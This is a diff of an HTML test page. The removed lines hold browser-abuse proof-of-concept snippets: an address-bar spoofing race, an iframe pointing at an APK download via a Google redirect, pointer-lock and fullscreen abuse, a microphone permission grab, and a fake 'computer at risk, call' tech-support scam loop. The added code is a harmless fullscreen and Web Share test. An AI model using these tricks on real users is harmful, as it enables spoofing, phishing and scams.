@@ -1,82 +1,32 @@
-<head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
-
+<!DOCTYPE html>
+<html>
 <body>
-    <a href="javascript:window.open('PWN-GOOGLE','x');" onclick="startSpoof()">Spoof</a>
-</body>
-    
-    <script>
-    
-    let windowSpoof;
-
-    function race() {
-      try {
-        windowSpoof.location.href !== 'https://www.google.com';
-      }
-      catch (e) {
-        windowSpoof.location.href='https://www.google.com';
-      }
-    }
-    
-    function startSpoof() {
-
-      windowSpoof = window.open("https://www.google.com","x");
-      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
-      <iframe id="frame" src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"></iframe>
-
-      setInterval('race()', 0);
-    
-    }
-   
-    </script>
-
-<html onclick=main()>
-<center>
-<h1> Click On Screen <h1>
-<script>
-    function main() {
-
-pointerLockElement.requestPointerLock();
-            fullscreenElement.appendChild(pointerLockElement)
-
-        fullscreenElement.requestFullscreen();
-
-
-    }
-</script>
-
-
-<div id="pointerLockElement"></div>
-
-<div id="fullscreenElement">
-</div>
-
-</html>
-
-  <input onclick="start()" type="button" value="Click here" />
+<button id="btn">Enter Fullscreen & Share</button>
 
 <script>
-  function start(){
-   var recognition = new webkitSpeechRecognition();
-  recognition.start();
-  navigator.webkitGetUserMedia({audio: true}, function(){}, function(){});
-  document.location = "https://www.google.com"
+const btn = document.getElementById("btn");
+
+btn.addEventListener("click", async () => {
+  try {
+    await document.documentElement.requestFullscreen();
+    console.log("Fullscreen activated");
+
+    if (navigator.share) {
+      await navigator.share({
+        title: "Test Share",
+        text: "Testing Web Share after fullscreen",
+        url: "https://example.com"
+      });
+      console.log("Share dialog opened");
+    } else {
+      alert("Web Share API not supported");
+    }
+
+  } catch (err) {
+    console.error(err);
   }
-
-  </script>
-
-
-  function test(){
-aaa = document.getElementById("aaa");
-aaa.style.opacity = '0';
-aaa.oninvalid = function (e) {
-e.target.setCustomValidity("WARNING!\nYOUR COMPUTER MAY BE AT RISK.\nCALL: 800-111-2222");
-};
-setInterval("document.getElementById('bbb').click()",1000);
-}
+});
 </script>
-<form>
-    <input placeholder="aaa" required id="aaa" />
-    <input id='bbb' type="submit" name="submit">
-</form>
+
+</body>
+</html>
